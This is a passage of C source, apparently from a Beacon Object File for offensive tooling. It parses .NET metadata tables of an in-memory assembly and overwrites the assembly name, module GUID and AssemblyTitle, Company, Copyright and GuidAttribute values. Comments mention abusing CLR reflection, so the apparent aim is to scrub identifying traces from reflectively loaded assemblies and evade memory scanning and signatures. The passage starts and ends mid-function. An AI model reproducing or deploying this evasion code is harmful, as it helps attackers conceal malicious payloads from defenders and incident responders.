				TableSizes[ID_INTERFACE_IMPL] = SIZE_TABLE_INTERFACE_IMPL;
				TableSizes[ID_MEMBER_REF] = SIZE_TABLE_MEMBER_REF;
				TableSizes[ID_CONSTANT] = SIZE_TABLE_CONSTANT;
				TableSizes[ID_CUSTOM_ATTRIBUTE] = SIZE_TABLE_CUSTOM_ATTRIBUTE;
				TableSizes[ID_FIELD_MARSHAL] = SIZE_TABLE_FIELD_MARSHAL;
				TableSizes[ID_DECL_SECURITY] = SIZE_TABLE_DECL_SECURITY;
				TableSizes[ID_CLASS_LAYOUT] = SIZE_TABLE_CLASS_LAYOUT;
				TableSizes[ID_FIELD_LAYOUT] = SIZE_TABLE_FIELD_LAYOUT;
				TableSizes[ID_STAND_ALONE_SIG] = SIZE_TABLE_STAND_ALONE_SIG;
				TableSizes[ID_EVENT_MAP] = SIZE_TABLE_EVENT_MAP;
				TableSizes[ID_EVENT] = SIZE_TABLE_EVENT;
				TableSizes[ID_PROPERTY_MAP] = SIZE_TABLE_PROPERTY_MAP;
				TableSizes[ID_PROPERTY] = SIZE_TABLE_PROPERTY;
				TableSizes[ID_METHOD_SEMANTICS] = SIZE_TABLE_METHOD_SEMANTICS;
				TableSizes[ID_METHOD_IMPL] = SIZE_TABLE_METHOD_IMPL;
				TableSizes[ID_MODULE_REF] = SIZE_TABLE_MODULE_REF;
				TableSizes[ID_TYPE_SPEC] = SIZE_TABLE_TYPE_SPEC;
				TableSizes[ID_IMPL_MAP] = SIZE_TABLE_IMPL_MAP;
				TableSizes[ID_FIELD_RVA] = SIZE_TABLE_FIELD_RVA;
				TableSizes[ID_ASSEMBLY] = SIZE_TABLE_ASSEMBLY;

				if (LargeStringIndex) {
					TableSizes[ID_MODULE] += 2;
					TableSizes[ID_TYPE_REF] += 2 * 2;
					TableSizes[ID_TYPE_DEF] += 2 * 2;
					TableSizes[ID_FIELD] += 2;
					TableSizes[ID_METHOD_DEF] += 2;
					TableSizes[ID_PARAM] += 2;
					TableSizes[ID_MEMBER_REF] += 2;
					TableSizes[ID_EVENT] += 2;
					TableSizes[ID_PROPERTY] += 2;
					TableSizes[ID_MODULE_REF] += 2;
					TableSizes[ID_IMPL_MAP] += 2;
					TableSizes[ID_ASSEMBLY] += 2;
				}

				if (LargeBlobIndex) {
					TableSizes[ID_FIELD] += 2;
					TableSizes[ID_METHOD_DEF] += 2;
					TableSizes[ID_MEMBER_REF] += 2;
					TableSizes[ID_CONSTANT] += 2;
					TableSizes[ID_CUSTOM_ATTRIBUTE] += 2;
					TableSizes[ID_FIELD_MARSHAL] += 2;
					TableSizes[ID_DECL_SECURITY] += 2;
					TableSizes[ID_STAND_ALONE_SIG] += 2;
					TableSizes[ID_PROPERTY] += 2;
					TableSizes[ID_TYPE_SPEC] += 2;
					TableSizes[ID_ASSEMBLY] += 2;
				}

				if (LargeGUIDIndex) {
					// literally only module
					TableSizes[ID_MODULE] += 2;
				}

				/* Begin tedious bool setting for coded and normal indices*/
				// TODO: wrap up in helpers
				// If e is a simple index into a table with index i, it is stored using 2 bytes if table i has less than 2^16 rows, otherwise it is stored using 4 bytes.

				WORD RelevantLargeCodedIndexTypeRefResolutionScope[] = { ID_MODULE, ID_MODULE_REF, ID_ASSEMBLY_REF, ID_TYPE_REF };
				bool LargeCodedIndexTypeRefResolutionScope = CodedIndexHelper(RelevantLargeCodedIndexTypeRefResolutionScope, sizeof(RelevantLargeCodedIndexTypeRefResolutionScope) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexTypeRefResolutionScope) TableSizes[ID_TYPE_REF] += 2;

				WORD RelevantLargeCodedIndexTypeDefExtends[] = { ID_TYPE_DEF, ID_TYPE_REF, ID_TYPE_SPEC };
				bool LargeCodedIndexTypeDefExtends = CodedIndexHelper(RelevantLargeCodedIndexTypeDefExtends, sizeof(RelevantLargeCodedIndexTypeDefExtends) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexTypeDefExtends) TableSizes[ID_TYPE_DEF] += 2;
				bool LargeIndexTypeDefFieldList = NumberPerTable[ID_FIELD] >= (1 << 16) ? true : false;
				if (LargeIndexTypeDefFieldList) TableSizes[ID_TYPE_DEF] += 2;
				bool LargeIndexTypeDefMethodList = NumberPerTable[ID_METHOD_DEF] >= (1 << 16) ? true : false;
				if (LargeIndexTypeDefMethodList) TableSizes[ID_TYPE_DEF] += 2;

				bool LargeIndexMethodDefParamList = NumberPerTable[ID_PARAM] >= (1 << 16) ? true : false;
				if (LargeIndexMethodDefParamList) TableSizes[ID_METHOD_DEF] += 2;

				WORD RelevantLargeCodedIndexInterfaceImplInterface[] = { ID_TYPE_DEF,ID_TYPE_REF,ID_TYPE_SPEC };
				bool LargeCodedIndexInterfaceImplInterface = CodedIndexHelper(RelevantLargeCodedIndexInterfaceImplInterface, sizeof(RelevantLargeCodedIndexInterfaceImplInterface) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexInterfaceImplInterface) TableSizes[ID_INTERFACE_IMPL] += 2;

				WORD RelevantLargeCodedIndexMemberRefClass[] = { ID_METHOD_DEF,ID_MODULE_REF,ID_TYPE_REF,ID_TYPE_SPEC };
				bool LargeCodedIndexMemberRefClass = CodedIndexHelper(RelevantLargeCodedIndexMemberRefClass, sizeof(RelevantLargeCodedIndexMemberRefClass) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexMemberRefClass) TableSizes[ID_MEMBER_REF] += 2;

				WORD RelevantLargeCodedIndexConstantParent[] = { ID_PARAM, ID_FIELD, ID_PROPERTY };
				bool LargeCodedIndexConstantParent = CodedIndexHelper(RelevantLargeCodedIndexConstantParent, sizeof(RelevantLargeCodedIndexConstantParent) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexConstantParent) TableSizes[ID_CONSTANT] += 2;

				// permission table is listed in spec but its not defined
				WORD RelevantLargeCodedIndexCustomAttributeParent[] = { ID_METHOD_DEF, ID_FIELD, ID_TYPE_REF, ID_TYPE_DEF,
					ID_PARAM, ID_INTERFACE_IMPL, ID_MEMBER_REF, ID_MODULE, /*ID_PERMISSION,*/ID_PROPERTY, ID_EVENT,
					ID_STAND_ALONE_SIG, ID_MODULE_REF, ID_TYPE_SPEC, ID_ASSEMBLY, ID_ASSEMBLY_REF, ID_FILE, ID_EXPORTED_TYPE,
					ID_MANIFEST_RESOURCE, ID_GENERIC_PARAM, ID_GENERIC_PARAM_CONSTRAINT, ID_METHOD_SPEC };
				bool LargeCodedIndexCustomAttributeParent = CodedIndexHelper(RelevantLargeCodedIndexCustomAttributeParent, sizeof(RelevantLargeCodedIndexCustomAttributeParent) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexCustomAttributeParent) TableSizes[ID_CUSTOM_ATTRIBUTE] += 2;

				WORD RelevantLargeCodedIndexCustomAttributeType[] = { ID_METHOD_DEF, ID_MEMBER_REF };
				bool LargeCodedIndexCustomAttributeType = CodedIndexHelper(RelevantLargeCodedIndexCustomAttributeType, sizeof(RelevantLargeCodedIndexCustomAttributeType) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexCustomAttributeType) TableSizes[ID_CUSTOM_ATTRIBUTE] += 2;

				WORD RelevantLargeCodedIndexFieldMarshalParent[] = { ID_FIELD, ID_PARAM };
				bool LargeCodedIndexFieldMarshalParent = CodedIndexHelper(RelevantLargeCodedIndexFieldMarshalParent, sizeof(RelevantLargeCodedIndexFieldMarshalParent) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexFieldMarshalParent) TableSizes[ID_FIELD_MARSHAL] += 2;

				WORD RelevantLargeCodedIndexDeclSecurityParent[] = { ID_TYPE_DEF, ID_METHOD_DEF, ID_ASSEMBLY };
				bool LargeCodedIndexDeclSecurityParent = CodedIndexHelper(RelevantLargeCodedIndexDeclSecurityParent, sizeof(RelevantLargeCodedIndexDeclSecurityParent) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexDeclSecurityParent) TableSizes[ID_DECL_SECURITY] += 2;

				bool LargeIndexClassLayoutParent = NumberPerTable[ID_TYPE_DEF] >= (1 << 16) ? true : false;
				if (LargeIndexClassLayoutParent) TableSizes[ID_CLASS_LAYOUT] += 2;

				bool LargeIndexFieldLayoutField = NumberPerTable[ID_FIELD] >= (1 << 16) ? true : false;
				if (LargeIndexFieldLayoutField) TableSizes[ID_FIELD_LAYOUT] += 2;

				bool LargeIndexEventMapParent = NumberPerTable[ID_TYPE_DEF] >= (1 << 16) ? true : false;
				if (LargeIndexEventMapParent) TableSizes[ID_EVENT_MAP] += 2;
				bool LargeIndexEventMapEventList = NumberPerTable[ID_EVENT] >= (1 << 16) ? true : false;
				if (LargeIndexEventMapEventList) TableSizes[ID_EVENT_MAP] += 2;

				WORD RelevantLargeCodedIndexEventEventType[] = { ID_TYPE_DEF,ID_TYPE_REF,ID_TYPE_SPEC };
				bool LargeCodedIndexEventEventType = CodedIndexHelper(RelevantLargeCodedIndexEventEventType, sizeof(RelevantLargeCodedIndexEventEventType) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexEventEventType) TableSizes[ID_EVENT] += 2;

				bool LargeIndexPropertyMapParent = NumberPerTable[ID_TYPE_DEF] >= (1 << 16) ? true : false;
				if (LargeIndexPropertyMapParent) TableSizes[ID_PROPERTY_MAP] += 2;
				bool LargeIndexPropertyMapProperty = NumberPerTable[ID_PROPERTY] >= (1 << 16) ? true : false;
				if (LargeIndexPropertyMapProperty) TableSizes[ID_PROPERTY_MAP] += 2;

				bool LargeIndexMethodSemanticsMethod = NumberPerTable[ID_METHOD_DEF] >= (1 << 16) ? true : false;
				if (LargeIndexMethodSemanticsMethod) TableSizes[ID_METHOD_SEMANTICS] += 2;
				WORD RelevantLargeCodedIndexMethodSemanticsAssociation[] = { ID_EVENT,ID_PROPERTY };
				bool LargeCodedIndexMethodSemanticsAssociation = CodedIndexHelper(RelevantLargeCodedIndexMethodSemanticsAssociation, sizeof(RelevantLargeCodedIndexMethodSemanticsAssociation) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexMethodSemanticsAssociation) TableSizes[ID_METHOD_SEMANTICS] += 2;

				bool LargeIndexMethodImplClass = NumberPerTable[ID_TYPE_DEF] >= (1 << 16) ? true : false;
				if (LargeIndexMethodImplClass) TableSizes[ID_METHOD_IMPL] += 2;
				WORD RelevantLargeCodedIndexMethodImplMethodBody[] = { ID_METHOD_DEF,ID_MEMBER_REF };
				bool LargeCodedIndexMethodImplMethodBody = CodedIndexHelper(RelevantLargeCodedIndexMethodImplMethodBody, sizeof(RelevantLargeCodedIndexMethodImplMethodBody) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexMethodImplMethodBody) TableSizes[ID_METHOD_IMPL] += 2;
				WORD RelevantLargeCodedIndexMethodImplMethodDeclaration[] = { ID_METHOD_DEF,ID_MEMBER_REF };
				bool LargeCodedIndexMethodImplMethodDeclaration = CodedIndexHelper(RelevantLargeCodedIndexMethodImplMethodDeclaration, sizeof(RelevantLargeCodedIndexMethodImplMethodDeclaration) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexMethodImplMethodDeclaration) TableSizes[ID_METHOD_IMPL] += 2;

				WORD RelevantLargeCodedIndexImplMapMemberForwaded[] = { ID_FIELD,ID_METHOD_DEF };
				bool LargeCodedIndexImplMapMemberForwarded = CodedIndexHelper(RelevantLargeCodedIndexImplMapMemberForwaded, sizeof(RelevantLargeCodedIndexImplMapMemberForwaded) / sizeof(WORD), NumberPerTable);
				if (LargeCodedIndexImplMapMemberForwarded) TableSizes[ID_IMPL_MAP] += 2;
				bool LargeIndexImplMapImportScope = NumberPerTable[ID_MODULE_REF] >= (1 << 16) ? true : false;
				if (LargeIndexImplMapImportScope) TableSizes[ID_IMPL_MAP] += 2;

				bool LargeIndexFieldRVAField = NumberPerTable[ID_FIELD] >= (1 << 16) ? true : false;
				if (LargeIndexFieldRVAField) TableSizes[ID_FIELD_RVA] += 2;

				/* END TEDIOUS BIT FLAGS. YEAH I SHOULD HAVE JUST MADE SOME STRUCTS EY*/
				DEBUG_PRINT("	STARTING AT Cursor at offset %p from metadata headeraddr\n", Cursor - MetadataHeaderAddr);
				DWORD accum = 0;
				for (WORD j = 0; j <= ID_ASSEMBLY; j++) {
					//DEBUG_PRINT("starting at %lu type %hu has %hu entries of size %hu\n", accum, j, NumberPerTable[j], TableSizes[j]);
					accum += NumberPerTable[j] * TableSizes[j];
				}
				for (WORD j = 0; j <= ID_ASSEMBLY; j++) {

					// todo: entirely cursor skip shit we dont care about
					for (WORD k = 0; k < NumberPerTable[j]; k++) {
						//DEBUG_PRINT("	Number per table %lu\n", NumberPerTable[j]);
						// --- BOF NOTE ---
						// Large switches can cause crashes
						// also importing undefined __ImageBase symbol :skull:
						//DEBUG_PRINT("	Type %hu Cursor at offset %p TableSize %hu\n", j, Cursor - MetadataHeaderAddr, TableSizes[j]);
						if (j == ID_MODULE) {
							push_vector(OffsetsIntoGUIDToStomp, *(WORD*)(Cursor + TableSizes[j] - 6));
							Cursor += TableSizes[j];
						}
						else if (j == ID_TYPE_DEF) {
							Cursor += TableSizes[j];
						}
						else if (j == ID_METHOD_DEF) {
							Cursor += TableSizes[j];
						}
						else if (j == ID_ASSEMBLY) {
							DWORD NameIndex = *(DWORD*)(Cursor + sizeof(DWORD) * 2 + sizeof(WORD) * 5);
							if (NameIndex) {
								DEBUG_PRINT("	Cursor at offset %p from metadata headeraddr Found string to stomp at offset %lu\n", Cursor-MetadataHeaderAddr, NameIndex);
								push_vector(OffsetsIntoStringToStomp, NameIndex);
							}
							Cursor += TableSizes[j];
						}
						else if (j == ID_TYPE_REF) {
							DWORD NameIndex;
							if (LargeStringIndex) {
								NameIndex = *(DWORD*)(Cursor + sizeof(WORD));
							}
							else {
								NameIndex = *(WORD*)(Cursor + sizeof(WORD));
							}
							// todo: guard stringheapaddr 
							char* TypeRefRowName = StringHeapAddr + NameIndex;

							if (strcmp(TypeRefRowName, "AssemblyTitleAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[0] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyDescriptionAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[1] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyCompanyAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[2] = k + 1; // 1 index expected

							}
							else if (strcmp(TypeRefRowName, "AssemblyProductAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[3] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyCopyrightAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[4] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyTrademarkAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[5] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "GuidAttribute") == 0) {
								GUIDTypeRefIndex = k + 1;
							}
							Cursor += TableSizes[j];
						}
						else if (j == ID_MEMBER_REF) {
							// check if the Class (indexed into typeref) of the .ctor is an index we care about 
							// should only be one constructor per? so one to one relationship?

							// MemberRefParent coded tag. We need to check its typeref; 3 Least sig bits = 1
							WORD Class = *(WORD*)Cursor;

							DWORD NameIndex;
							if (LargeStringIndex) {
								NameIndex = *(DWORD*)(Cursor + sizeof(WORD));
							}
							else {
								NameIndex = *(WORD*)(Cursor + sizeof(WORD));
							}

							Cursor += TableSizes[j];

							char* MemberRefRowName = StringHeapAddr + NameIndex;
							if (strcmp(MemberRefRowName, ".ctor") == 0) {
								SHORT Tag = Class & 0b111;
								if (Tag == 1) {
									WORD TypeRefIndex = Class >> 3;
									for (int l = 0; l < 6; l++) {
										if (AssemblyAttributeTypeRefIndices[l] == TypeRefIndex) {
											AssemblyAttributeMemberRefIndices[l] = k + 1;
											break;
										}
									}

									if (GUIDTypeRefIndex == TypeRefIndex) {
										GUIDMemberRefIndex = k + 1;
									}
								}
							}
						}
						else if (j == ID_CUSTOM_ATTRIBUTE) {
							// yeah just recalculate it everytime who cares
							// the spec isn't clear when it says "possible tables", ya mean in this specific assembly or according to the
							// different tag types?


							// recall that for coded index e.g. parent pointer here
							// size is dynamic TODO: make the sizing less fragile above. im too lazy to do it right now definitely breaks other ingests

							SHORT LinkedTable;
							SHORT TypeTag;

							DWORD Parent;
							DWORD Type; // type is potentially dword
							WORD Value;

							if (LargeCodedIndexCustomAttributeParent) {
								Parent = *(DWORD*)Cursor;
								Cursor += sizeof(DWORD);
							}
							else {
								Parent = *(WORD*)Cursor;
								Cursor += sizeof(WORD);
							}

							if (LargeCodedIndexCustomAttributeType) {
								Type = *(DWORD*)Cursor;
								Cursor += sizeof(DWORD);
							}
							else {
								Type = *(WORD*)Cursor;
								Cursor += sizeof(WORD);
							}

							Value = *(WORD*)Cursor;
							Cursor += sizeof(WORD);
							// todo large coded type 

							LinkedTable = Parent & (0b11111);
							TypeTag = Type & (0b111);

							// if this is linked to Assembly or Module save it for further inspection
							// type tag == 3 -> member ref
							if ((LinkedTable == 14) && (TypeTag == 3)) {
								//CustomAttributesToInspect.push_back(std::pair<DWORD, WORD>(Type, Value));
								push_vector(CustomAttributesToInspectFirst, Type);
								push_vector(CustomAttributesToInspectSecond, Value);
							}
						}
						else {
							// if we're not parsing the structure, just increment
							Cursor += TableSizes[j];
						}
#if 0
						switch (j) {
						default:
							// if we're not parsing the structure, just increment
							Cursor += TableSizes[j];
							break;

						case ID_MODULE: {

							//TableModule* ModuleRow = (TableModule*)Cursor;


							/*
							Mvid (an index into the Guid heap; simply a Guid used to distinguish between two
								versions of the same module)
							EncId (an index into the Guid heap; reserved, shall be zero)
							EncBaseId (an index into the Guid heap; reserved, shall be zero)
							*/

							// push MVID
							// OffsetsIntoGUIDToStomp.push_back(*(WORD*)(Cursor + TableSizes[j] - 6));
							push_vector(OffsetsIntoGUIDToStomp, *(WORD*)(Cursor + TableSizes[j] - 6));
							//OffsetsIntoGUIDToStomp
							
							// iirc this broke things ? //OffsetsIntoGUIDToStomp.push_back(ModuleRow->ENCID);
							
							Cursor += TableSizes[j];
							break;

						}


						case ID_TYPE_DEF: {
							//TableTypeDef* TypeDefRow = (TableTypeDef*)Cursor;
							/* think this breaks shit unsurprisingly, even w/o reflection use by the loaded assembly?
							if (TypeDefRow->Name != 0) OffsetsIntoStringToStomp.push_back(TypeDefRow->Name);
							if (TypeDefRow->Namespace != 0) OffsetsIntoStringToStomp.push_back(TypeDefRow->Namespace);
							*/
							Cursor += TableSizes[j];
							break;
						}
						case ID_METHOD_DEF: {
							//TableMethodDef* MethodDefRow = (TableMethodDef*)Cursor;
							//TODO: If we stomp these the CLR reflection that we are abusing can't find the entrypoint. So - todo, don't stomp the entrypoint.
							// can parse and resolve entrypoint RVA then compare?
							//if (MethodDefRow->Name != 0) OffsetsIntoStringToStomp.push_back(MethodDefRow->Name);
							Cursor += TableSizes[j];
							break;
						}

						case ID_ASSEMBLY: {
							//TableAssembly* AssemblyRow = (TableAssembly*)Cursor;
							//!!!! This is what the identity string is built from. This is separate from AssemblyAttribute stomping
							DWORD NameIndex = *(DWORD*)(Cursor + sizeof(DWORD) * 2 + sizeof(WORD) * 5);

							if (NameIndex) {
								//OffsetsIntoStringToStomp.push_back(NameIndex);
								push_vector(OffsetsIntoStringToStomp, NameIndex);
							}

							Cursor += TableSizes[j];
							break;
						}


						case ID_TYPE_REF: {
							DWORD NameIndex;
							if (LargeStringIndex) {
								NameIndex = *(DWORD*)(Cursor + sizeof(WORD));
							}
							else {
								NameIndex = *(WORD*)(Cursor + sizeof(WORD));
							}
							// todo: guard stringheapaddr 
							char* TypeRefRowName = StringHeapAddr + NameIndex;

							// these are not necessarily strings

							if (strcmp(TypeRefRowName, "AssemblyTitleAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[0] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyDescriptionAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[1] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyCompanyAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[2] = k + 1; // 1 index expected

							}
							else if (strcmp(TypeRefRowName, "AssemblyProductAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[3] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyCopyrightAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[4] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "AssemblyTrademarkAttribute") == 0) {
								AssemblyAttributeTypeRefIndices[5] = k + 1; // 1 index expected
							}
							else if (strcmp(TypeRefRowName, "GuidAttribute") == 0) {
								GUIDTypeRefIndex = k + 1;
							}
							Cursor += TableSizes[j];
							break;
						}

						case ID_MEMBER_REF: {
							// check if the Class (indexed into typeref) of the .ctor is an index we care about 
							// should only be one constructor per? so one to one relationship?

							// MemberRefParent coded tag. We need to check its typeref; 3 Least sig bits = 1
							WORD Class = *(WORD*)Cursor;

							DWORD NameIndex;
							if (LargeStringIndex) {
								NameIndex = *(DWORD*)(Cursor + sizeof(WORD));
							}
							else {
								NameIndex = *(WORD*)(Cursor + sizeof(WORD));
							}

							Cursor += TableSizes[j];

							char* MemberRefRowName = StringHeapAddr + NameIndex;
							if (strcmp(MemberRefRowName, ".ctor") != 0) break;
							SHORT Tag = Class & 0b111;
							if (Tag != 1) break;
							WORD TypeRefIndex = Class >> 3;
							for (int l = 0; l < 6; l++) {
								if (AssemblyAttributeTypeRefIndices[l] == TypeRefIndex) {
									AssemblyAttributeMemberRefIndices[l] = k + 1;
									break;
								}
							}

							if (GUIDTypeRefIndex == TypeRefIndex) {
								GUIDMemberRefIndex = k + 1;
							}

							break;
						}

						case ID_CUSTOM_ATTRIBUTE: {
							// yeah just recalculate it everytime who cares
							// the spec isn't clear when it says "possible tables", ya mean in this specific assembly or according to the
							// different tag types?


							// recall that for coded index e.g. parent pointer here
							// size is dynamic TODO: make the sizing less fragile above. im too lazy to do it right now definitely breaks other ingests

							SHORT LinkedTable;
							SHORT TypeTag;

							DWORD Parent;
							DWORD Type; // type is potentially dword
							WORD Value;

							if (LargeCodedIndexCustomAttributeParent) {
								Parent = *(DWORD*)Cursor;
								Cursor += sizeof(DWORD);
							}
							else {
								Parent = *(WORD*)Cursor;
								Cursor += sizeof(WORD);
							}

							if (LargeCodedIndexCustomAttributeType) {
								Type = *(DWORD*)Cursor;
								Cursor += sizeof(DWORD);
							}
							else {
								Type = *(WORD*)Cursor;
								Cursor += sizeof(WORD);
							}

							Value = *(WORD*)Cursor;
							Cursor += sizeof(WORD);
							// todo large coded type 

							LinkedTable = Parent & (0b11111);
							TypeTag = Type & (0b111);

							// if this is linked to Assembly or Module save it for further inspection
							// type tag == 3 -> member ref
							if ((LinkedTable == 14) && (TypeTag == 3)) {
								//CustomAttributesToInspect.push_back(std::pair<DWORD, WORD>(Type, Value));
								push_vector(CustomAttributesToInspectFirst, Type);
								push_vector(CustomAttributesToInspectSecond, Value);
							}
							break;
						}


						case 0x03:
						case 0x05:
						case 0x7:
						case 0x13:
						case 0x16:
							DEBUG_PRINT("	[!] Unknown table type %hu ingested!!!??? Aborting identity stomp.\n", j);
							return false;
							break;
						}

#endif
					}
				}
				// go do our stomping now that we have indices
				break;

			}

		}


		/* Can't be bothered implementing uniq equiv for dummy vector. restomping doesn't exactly break anything I guess
		auto it = std::unique(OffsetsIntoStringToStomp.begin(), OffsetsIntoStringToStomp.end());
		OffsetsIntoStringToStomp.resize(std::distance(OffsetsIntoStringToStomp.begin(), it));

		it = std::unique(OffsetsIntoGUIDToStomp.begin(), OffsetsIntoGUIDToStomp.end());
		OffsetsIntoGUIDToStomp.resize(std::distance(OffsetsIntoGUIDToStomp.begin(), it));
		*/


		/*
		it = std::unique(OffsetsIntoBlobToStomp.begin(), OffsetsIntoBlobToStomp.end());
		OffsetsIntoBlobToStomp.resize(std::distance(OffsetsIntoBlobToStomp.begin(), it));
		*/


		/*
		o Every index into the String, Blob, or Userstring heaps shall point into that
		heap, neither before its start (offset 0), nor after its end.
		o Every index into the Guid heap shall lie between 1 and the maximum
		element number in this module, inclusive.
		o Every index (row number) into another metadata table shall lie between 0
		and that tableÅfs row count + 1 (for some tables, the index can point just
		past the end of any target table, meaning it indexes nothing).

		*/

		// Actual GUID in blob might be a CustomAttribute? 
		// is it always preceeded by a 00 24 (null then $) ? 

		// looks it; I see copyright strings and everything. Okay, need to parse custom attributes I guess.
		// they have a parent; theres also some sorting guarantees. 
		// We only care about default AssemblyInfo stuff so check that parent is the first module and uh

		// Parent an index into a metadata table that has an associated HasCustomAttribute coded index
		// Type shall index a valid row in the Method or MemberRef table.
		// Parent can be an index into any metadata table, except the CustomAttribute table itself

		// aight so its bit tag
		// important values:
		// (0xe) 14 for assembly
		// 7 for module

		/*
		* If e is a coded index that points into table ti
			 out of n possible tables t0, tn1, then it
			is stored as e << (log n) | tag{ t0, tn-1}[ ti] using 2 bytes if the maximum number
			of rows of tables t0, tn1, is less than 2(16 - (log n)), and using 4 bytes otherwise. The
			family of finite maps tag{ t0, tn1} is defined below. Note that decoding a physical
			row requires the inverse of this mapping. [For example, the Parent column of the
			Constant table indexes a row in the Field, Param, or Property tables. The actual
			table is encoded into the low 2 bits of the number, using the values: 0 => Field, 1 =>
			Param, 2 => Property.The remaining bits hold the actual row number being
			indexed. For example, a value of 0x321, indexes row number 0xC8 in the Param
			table.]
		*/

		// i.e. just mask out 5 Least sig bits and if thats assembly or module, wipe that blob index (anything related to assemblies we kick out hopefully that doesn't break anything)

		// the type indexes a constructor method and the owner of the constructor method is the type that this customattribute points to
		// so we need to walk the methodref table to find which one links to the typeref which is String or GuidAttribute

		DEBUG_PRINT("	Starting to stomp\n");
		for (int i = 0; i < NumberOfStreams; i++) {
			Cursor = MetadataHeaderAddr + StreamHeaders[i]->Offset;

			if (strcmp(StreamHeaders[i]->StreamName, ID_Strings) == 0) {
				DEBUG_PRINT("	Overwriting %d Strings - stream offset %p\n", OffsetsIntoStringToStomp->size, Cursor);
				//for (const DWORD& Index : OffsetsIntoStringToStomp) {
				for(int i = 0; i < OffsetsIntoStringToStomp->size; i++) {
					
					DWORD Index = get_vector(OffsetsIntoStringToStomp, i);

					char* StringToStomp = (char*)Cursor + (Index);
					// randomly pull characters based on the heap index

					char StompChar = OverwriteArray[Index % strlen(OverwriteArray)];

					// write until we see a null byte
					// TODO: more sophisticated stomping
					DEBUG_PRINT("	Offset is %lu", Index);
					DEBUG_PRINT("	%c%c%c\n", StringToStomp, StringToStomp+1, StringToStomp+2);
					memset(StringToStomp, StompChar, strlen(StringToStomp));

				}
			}
			else if (strcmp(StreamHeaders[i]->StreamName, ID_GUID) == 0) {
				DEBUG_PRINT("	Overwriting GUIDs\n");
				//for (const DWORD& Index : OffsetsIntoGUIDToStomp) {
				for(int i = 0; i < OffsetsIntoGUIDToStomp->size; i++) {
					DWORD Index = get_vector(OffsetsIntoGUIDToStomp, i);
					// write 16 byte GUID, this is just the one that generated for each new version. could still be sigd
					// quoth: The Guid heap is an array of GUIDs, each 16 bytes wide. Its
					// first element is numbered 1, its second 2, and so on
					unsigned char* StringToStomp = (unsigned char*)Cursor + ((Index - 1) * 16);
					// randomly pull characters based on the heap index
					char StompChar = OverwriteArray[Index % strlen(OverwriteArray)];
					// write until we see a null byte
					// TODO: more sophisticated stomping
					memset(StringToStomp, StompChar, 16);
				}
			}
			else if (strcmp(StreamHeaders[i]->StreamName, ID_Blob) == 0) {

				// type, value
				//for (const std::pair<DWORD, WORD> CustomAttribute : CustomAttributesToInspect) {
				for(int i = 0; i < CustomAttributesToInspectFirst->size; i++) {
					DWORD CustomAttributeFirst = get_vector(CustomAttributesToInspectFirst, i);
					DWORD CustomAttributeSecond = get_vector(CustomAttributesToInspectSecond, i);
					// 3 bits encode customattributetybe
					DWORD MemberRefIndex = (DWORD)(/*CustomAttribute.first*/CustomAttributeFirst) >> 3;
					char* StringToStomp = (char*)Cursor + CustomAttributeSecond/*CustomAttribute.second*/;

					// randomly pull characters baed on blob index
					char StompChar = OverwriteArray[/*CustomAttribute.second*/ CustomAttributeSecond % strlen(OverwriteArray)];
					/*
						AssemblyTitle
						AssemblyDescription
						AssemblyCompany
						AssemblyProduct
						AssemblyCopyright
						AssemblyAttribute
					*/
					if (MemberRefIndex == AssemblyAttributeMemberRefIndices[0]) {
						// need to offset by 4? not sure what those bytes at the start are
						DEBUG_PRINT("	[*] Stomping AssemblyTitle\n");
						StringToStomp += 4;
					}
					else if (MemberRefIndex == AssemblyAttributeMemberRefIndices[1]) {
						DEBUG_PRINT("	[*] Stomping AssemblyDescription\n");
						StringToStomp += 4;
					}
					else if (MemberRefIndex == AssemblyAttributeMemberRefIndices[2]) {
						DEBUG_PRINT("	[*] Stomping AssemblyCompany\n");
						StringToStomp += 4;
					}
					else if (MemberRefIndex == AssemblyAttributeMemberRefIndices[3]) {
						DEBUG_PRINT("	[*] Stomping AssemblyProduct\n");
						StringToStomp += 4;
					}
					else if (MemberRefIndex == AssemblyAttributeMemberRefIndices[4]) {
						DEBUG_PRINT("	[*] Stomping AssemblyCopyright\n");
						StringToStomp += 4;
					}
					else if (MemberRefIndex == AssemblyAttributeMemberRefIndices[5]) {
						DEBUG_PRINT("	[*] Stomping AssemblyAttribute\n");
						StringToStomp += 4;
					}
					else if (MemberRefIndex == GUIDMemberRefIndex) {
						DEBUG_PRINT("	[*] Stomping GUID\n");
						StringToStomp += 5; // 4 + skip $
						// fixed length but also should be null terminated
					}
					else {
						continue;
					}

					memset(StringToStomp, StompChar, strlen(StringToStomp));
				}
				// go through the attributes we need to inspect and check if the member ref matches. if so, do something appropriate
				// TODO: 
